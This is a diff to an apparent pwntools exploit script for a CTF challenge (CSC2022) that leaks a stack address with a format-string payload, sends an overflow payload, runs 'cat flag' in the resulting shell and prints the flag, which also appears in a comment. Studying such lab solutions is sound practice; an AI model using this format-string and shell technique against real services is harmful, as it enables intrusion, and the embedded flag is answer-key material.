@@ -28,8 +28,8 @@ rmt.recvuntil('Wanna get my secret? Come and get it with your payload <3')
 
 rmt.sendline('%38$p')
 
-print(rmt.recv())
-rbp = rmt.recv().decode().split('W')[0][2:]
+rmt.recvline()
+rbp = rmt.recvline().decode().split('W')[0][2:]
 rbp = int(rbp, 16) - 288
 
 # payld = payld + (rbp).to_bytes(8, byteorder="big")
@@ -39,8 +39,12 @@ print(f'Stack pointer = {rbp}')
 print(len(payld))
 
 rmt.sendline(payld)
+rmt.sendline('cat flag'.encode())
 
-rmt.interactive()
+ret = rmt.recvline().split(b'CSC2022')[1].decode()
+print(f'CSC2022{ret}')
+
+# rmt.interactive()
 
 # cat flag
 # CSC2022{4Hha! Y0u h@ve g0t my s3cr3t! Contr@t3!!}
